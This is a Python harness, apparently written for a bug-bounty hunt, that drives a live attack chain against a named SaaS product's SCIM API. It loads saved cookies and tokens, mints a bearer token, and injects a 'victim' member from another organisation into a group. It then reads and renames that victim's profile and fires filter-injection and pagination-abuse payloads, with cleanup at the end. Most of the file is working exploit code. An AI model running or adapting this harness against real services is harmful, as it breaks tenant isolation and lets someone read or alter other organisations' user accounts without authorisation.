#!/usr/bin/env python3
"""R19 HUNT8 v3 (recovered copy — durable storage in recon/; copy to scripts/ to run).
SCIM live harness per docs (fires when support key arrives).
Input (any one shape) via CLI or scripts/.r19_support_key.json:
  {"access_token": "..."}                                  raw SCIM bearer
  {"client_id": "...", "client_secret": "..."}             support-minted client (OAuth2)
  {"_clientId": "...", "_clientSecret": "..."}             REST-client-object shape
Chain (docs + report methodology, all writes zeno-marked, same-run cleanup):
  1) resolve bearer (client_credentials scope=scim via /trust/oauth/token)
  2) identity probe GET /Users?count=1
  3) inventory /Users /Groups /Schemas (+ .search)
  4) Okta-UA differential on /Groups
  5) own-user create (zeno-r19-scim@ alias) -> PUT rename -> PATCH role -> revert
  6) REPORT CHAIN: POST /Groups zeno-r19-group -> PATCH members add ORG member ID
     -> GET verify -> victim profile read -> TST pending check -> rename+REVERT if injected
  7) cross-org enumeration (read-only filter)
  8) filter injection GET /Users + POST /Users/.search
  9) pagination abuse
 10) cleanup: DELETE group, DELETE own users
Run: cp recon/r19_hunt8_harness.py scripts/r19_hunt8.py && python3 scripts/r19_hunt8.py"""
import json, ssl, sys, urllib.request, urllib.error, urllib.parse, pathlib

BASE = pathlib.Path("/home/z/my-project")
OUT = BASE / "recon" / "r19_hunt8.txt"
COOK = BASE / "cookies"
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
OKTA_UA = "okta-sdk-python/2.9.3 python/3.11"
SCIM = "https://app.launchdarkly.com/trust/scim/v2"
ORG_MEMBER_ID = "6ac28fd11c28fb07516cf363"
ctx = ssl.create_default_context()

def log(*a):
    print(*a)
    with open(OUT, "a") as f:
        f.write(" ".join(str(x) for x in a) + "\n")

def req(url, headers=None, method="GET", data=None, ua=UA):
    h = {"User-Agent": ua}
    h.update(headers or {})
    b = json.dumps(data).encode() if data is not None else None
    if b is not None:
        h.setdefault("Content-Type", "application/json")
    r = urllib.request.Request(url, headers=h, method=method, data=b)
    try:
        with urllib.request.urlopen(r, context=ctx, timeout=25) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return 0, str(e).encode()

def cookie_val(p):
    return open(p).read().strip().split("Cookie: ", 1)[-1]

def jload(b):
    try:
        return json.loads(b)
    except Exception:
        return {}

open(OUT, "w").close()
log("=== R19 HUNT8 v3 (docs-driven SCIM harness) ===")

keyfile = BASE / "scripts" / ".r19_support_key.json"
tok = None; cid = None; csec = None
if "--token" in sys.argv:
    tok = sys.argv[sys.argv.index("--token") + 1]
elif "--client-id" in sys.argv:
    cid = sys.argv[sys.argv.index("--client-id") + 1]
    csec = sys.argv[sys.argv.index("--client-secret") + 1]
elif keyfile.exists():
    k = jload(keyfile.read_bytes()) or {}
    tok = k.get("access_token") or k.get("token") or k.get("key")
    cid = k.get("client_id") or k.get("_clientId")
    csec = k.get("client_secret") or k.get("_clientSecret")
if not (tok or (cid and csec)):
    log("NO KEY: provide scripts/.r19_support_key.json or --token/--client-id args")
    sys.exit(1)

BEARER = None
if tok:
    BEARER = tok
    log("cred mode: raw bearer token")
else:
    log("cred mode: OAuth2 client -> minting token (client_credentials scope=scim)")
    form = urllib.parse.urlencode({"grant_type": "client_credentials",
                                   "client_id": cid, "client_secret": csec,
                                   "scope": "scim"}).encode()
    r = urllib.request.Request("https://app.launchdarkly.com/trust/oauth/token",
                               headers={"User-Agent": UA,
                                        "Content-Type": "application/x-www-form-urlencoded"},
                               data=form, method="POST")
    try:
        with urllib.request.urlopen(r, context=ctx, timeout=25) as resp:
            t = json.loads(resp.read())
        BEARER = t.get("access_token")
        json.dump(t, open(BASE / "scripts" / ".r19_scim_token.json", "w"))
        log(f"minted: scope={t.get('scope')} expires_in={t.get('expires_in')}")
    except urllib.error.HTTPError as e:
        log(f"MINT FAILED -> {e.code} {e.read()[:300]}")
        sys.exit(1)
BH = {"Authorization": f"Bearer {BEARER}"}

M = open(COOK / "policy_token.txt").read().strip()
st, body = req("https://app.launchdarkly.com/api/v2/members/me", {"Authorization": M})
ORG_EMAIL = jload(body).get("_email", "")
log(f"victim (Account B) = {ORG_EMAIL} member={ORG_MEMBER_ID}")

created_users, created_group = [], None
try:
    log(""); log("=== 2) identity probe ===")
    st, body = req(f"{SCIM}/Users?count=1", BH)
    log(f"GET /Users?count=1 -> {st} {body[:300]}")
    if st in (401, 403):
        log("bearer rejected as SCIM principal -> stopping")
        sys.exit(1)

    log(""); log("=== 3) inventory ===")
    for p in ["/Users", "/Groups", "/Schemas"]:
        st, body = req(SCIM + p, BH)
        log(f"GET {p} -> {st} {body[:260]}")

    log(""); log("=== 4) okta-UA differential ===")
    st1, b1 = req(f"{SCIM}/Groups", BH, ua=UA)
    st2, b2 = req(f"{SCIM}/Groups", BH, ua=OKTA_UA)
    log(f"GET /Groups default-UA -> {st1} {b1[:200]}")
    log(f"GET /Groups okta-UA    -> {st2} {b2[:200]}")
    if st1 != st2:
        log("!! UA-BASED GATE DIFFERENTIAL — potential finding")

    log(""); log("=== 5) own user lifecycle ===")
    NEWU = "zeno-r19-scim@bugcrowdninja.com"
    st, body = req(f"{SCIM}/Users", BH, method="POST", data={
        "schemas": ["urn:ietf:params:scim:schemas:core:2.0:User"],
        "userName": NEWU,
        "name": {"givenName": "zeno-r19", "familyName": "scim-probe"},
        "emails": [{"value": NEWU, "primary": True}]})
    log(f"POST /Users -> {st} {body[:400]}")
    nu = jload(body)
    uid = nu.get("id", "")
    if uid:
        created_users.append(uid)
        log(f"own user id={uid} active={nu.get('active')} role={nu.get('role')}")
        st, body = req(f"{SCIM}/Users/{uid}", BH, method="PUT", data={
            "schemas": ["urn:ietf:params:scim:schemas:core:2.0:User"],
            "userName": NEWU, "active": True,
            "name": {"givenName": "renamed", "familyName": "r19probe"},
            "emails": [{"value": NEWU, "primary": True}]})
        log(f"PUT rename -> {st} {json.dumps(jload(body).get('name', body[:150]))}")
        st, body = req(f"{SCIM}/Users/{uid}", BH, method="PATCH", data={
            "schemas": ["urn:ietf:params:scim:api:messages:2.0:PatchOp"],
            "Operations": [{"op": "replace", "path": "/role", "value": "writer"}]})
        log(f"PATCH role=writer -> {st} {body[:200]}")
        st, body = req(f"{SCIM}/Users/{uid}", BH, method="PATCH", data={
            "schemas": ["urn:ietf:params:scim:api:messages:2.0:PatchOp"],
            "Operations": [{"op": "replace", "path": "/role", "value": "reader"}]})
        log(f"PATCH role=reader (revert) -> {st} {body[:120]}")
        st, body = req(f"{SCIM}/Users/{uid}", BH, method="PATCH",
                       headers={"Content-Type": "application/json"},
                       data=[{"op": "replace", "path": "/name/familyName",
                              "value": "r19jsonpatch"}])
        log(f"JSON-PATCH familyName -> {st} {body[:200]}")

    log(""); log("=== 6) report chain: group + cross-org member injection ===")
    st, body = req(f"{SCIM}/Groups", BH, method="POST", data={
        "schemas": ["urn:ietf:params:scim:schemas:core:2.0:Group"],
        "displayName": "zeno-r19-group"})
    log(f"POST /Groups -> {st} {body[:300]}")
    gid = jload(body).get("id", "")
    if gid:
        created_group = gid
        log(f"group id={gid}")
        st, body = req(f"{SCIM}/Groups/{gid}", BH, method="PATCH", data={
            "schemas": ["urn:ietf:params:scim:api:messages:2.0:PatchOp"],
            "Operations": [{"op": "add", "path": "members",
                            "value": [{"value": ORG_MEMBER_ID,
                                       "display": ORG_EMAIL}]}]})
        log(f"PATCH /Groups/{gid} add ORG member -> {st} {body[:400]}")
        st, body = req(f"{SCIM}/Groups/{gid}", BH)
        members = jload(body).get("members", [])
        log(f"GET /Groups/{gid} -> {st} members={[m.get('value') for m in members]}")
        if any(m.get("value") == ORG_MEMBER_ID for m in members):
            log("!!! CROSS-ORG MEMBER INJECTION CONFIRMED (report vector works)")
            st, body = req(f"{SCIM}/Users/{ORG_MEMBER_ID}", BH)
            log(f"GET /Users/{ORG_MEMBER_ID} (TST scim) -> {st} {body[:400]}")
            st, body = req("https://app.launchdarkly.com/api/v2/members?limit=50",
                           {"Cookie": cookie_val(COOK / "tester.cookie")})
            ms = jload(body).get("items", [])
            hit = [m for m in ms if ORG_EMAIL in str(m.get("_email", ""))]
            log(f"TST members via session -> {st} n={len(ms)} ORG-email-present={bool(hit)}")
            if hit:
                log(f"pending entry: {[{k: m.get(k) for k in ('_id','_email','_status','role')} for m in hit]}")
            st, body = req(f"{SCIM}/Users/{ORG_MEMBER_ID}", BH, method="PATCH", data={
                "schemas": ["urn:ietf:params:scim:api:messages:2.0:PatchOp"],
                "Operations": [{"op": "replace", "path": "/name/givenName",
                                "value": "zeno-crossorg-probe"}]})
            log(f"PATCH victim givenName -> {st} {body[:300]}")
            st, body = req(f"{SCIM}/Users/{ORG_MEMBER_ID}", BH, method="PATCH", data={
                "schemas": ["urn:ietf:params:scim:api:messages:2.0:PatchOp"],
                "Operations": [{"op": "replace", "path": "/name/givenName",
                                "value": "zeno"}]})
            log(f"PATCH victim givenName revert -> {st} {body[:150]}")
        st, body = req(f"{SCIM}/Groups/{gid}", BH, method="PATCH", data={
            "schemas": ["urn:ietf:params:scim:api:messages:2.0:PatchOp"],
            "Operations": [{"op": "remove", "path":
                            f"members[value eq \"{ORG_MEMBER_ID}\"]"}]})
        log(f"PATCH remove member (cleanup) -> {st} {body[:200]}")

    log(""); log("=== 7) cross-org enumeration (read-only) ===")
    if ORG_EMAIL:
        q = urllib.parse.quote(f'userName eq "{ORG_EMAIL}"', safe="")
        st, body = req(f"{SCIM}/Users?filter={q}", BH)
        log(f"filter eq ORG-email -> {st} total={jload(body).get('totalResults')} {body[:200]}")

    log(""); log("=== 8) filter injection ===")
    INJ = ['userName eq "x" or userName pr',
           'userName eq "x") or (userName pr',
           f'emails.value eq "{NEWU}" or userName pr',
           "userName eq \"x' or '1'='1",
           'userName co "zeno0" or role pr',
           f'urn:ietf:params:scim:schemas:core:2.0:User:userName eq "{NEWU}"']
    for f_ in INJ:
        q = urllib.parse.quote(f_, safe="")
        st, body = req(f"{SCIM}/Users?filter={q}", BH)
        log(f"GET filter[{f_[:44]}] -> {st} {body[:130]}")
        st, body = req(f"{SCIM}/Users/.search", BH, method="POST",
                       data={"filter": f_, "startIndex": 1, "count": 10})
        log(f".search  [{f_[:44]}] -> {st} {body[:130]}")

    log(""); log("=== 9) pagination abuse ===")
    for q in ["startIndex=0&count=100000", "count=-1", "startIndex=-5", "count=0"]:
        st, body = req(f"{SCIM}/Users?{q}", BH)
        log(f"Users?{q} -> {st} {body[:120]}")

finally:
    log(""); log("=== 10) cleanup ===")
    if created_group:
        st, body = req(f"{SCIM}/Groups/{created_group}", BH, method="DELETE")
        log(f"DELETE /Groups/{created_group} -> {st}")
        st, body = req(f"{SCIM}/Groups/{created_group}", BH)
        log(f"verify group gone -> {st}")
    for u in created_users:
        st, body = req(f"{SCIM}/Users/{u}", BH, method="DELETE")
        log(f"DELETE /Users/{u} -> {st}")
        st, body = req(f"{SCIM}/Users/{u}", BH)
        log(f"verify user gone -> {st}")
    log("hunt8 v3 complete")
